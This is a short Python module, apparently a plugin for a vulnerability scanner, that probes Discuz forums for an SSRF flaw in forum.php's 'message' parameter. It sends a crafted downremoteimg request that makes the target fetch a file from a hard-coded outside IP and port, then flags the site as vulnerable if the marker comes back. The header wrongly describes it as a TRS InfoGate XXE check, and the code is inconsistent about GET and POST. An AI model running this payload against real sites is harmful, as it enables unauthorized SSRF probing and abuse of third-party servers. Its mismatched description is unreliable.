#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: discuz论坛forum.php参数message SSRF漏洞
referer: unknown
author: Lucifer
description: trs infogate插件 blind XML实体注入。
'''
import urllib
import requests
import hashlib
import time
import datetime

def UrlProcessing(url):
    if url.startswith("http"):#判断是否有http头，如果没有就在下面加入
        res = urllib.parse.urlparse(url)
    else:
        res = urllib.parse.urlparse('http://%s' % url)
    return res.scheme, res.hostname, res.port

time_stamp = time.mktime(datetime.datetime.now().timetuple())
m = hashlib.md5(str(time_stamp).encode(encoding='utf-8'))
md5_str = m.hexdigest()
payload = "/forum.php?mod=ajax&action=downremoteimg&message=[img=1,1]http://45.76.158.91:6868/"+md5_str+".jpg[/img]&formhash=09cec465"
def medusa(Url,RandomAgent,ProxyIp):

    scheme, url, port = UrlProcessing(Url)
    if port is None and scheme == 'https':
        port = 443
    elif port is None and scheme == 'http':
        port = 80
    else:
        port = port
    global   resp
    payload_url = scheme+"://"+url+payload
    headers = {
        'Accept-Encoding': 'gzip, deflate',
        'Accept': '*/*',
        'User-Agent': RandomAgent,
    }
    try:
        #s = requests.session()
        if ProxyIp!=None:
            proxies = {
                # "http": "http://" + str(ProxyIps) , # 使用代理前面一定要加http://或者https://
                "http": "http://" + str(ProxyIp)
            }
            resp = requests.get(payload_url, headers=headers, proxies=proxies, timeout=5, verify=False)
        elif ProxyIp==None:
            resp = requests.post(payload_url,headers=headers, timeout=5, verify=False)
        con = resp.text
        code = resp.status_code
        if md5_str in con:
            Medusa = "{} 存在discuz论坛forum.php参数message SSRF漏洞\r\n漏洞详情:\r\nPayload:{}\r\n".format(url, payload_url)
            return (Medusa)
    except Exception as e:
        pass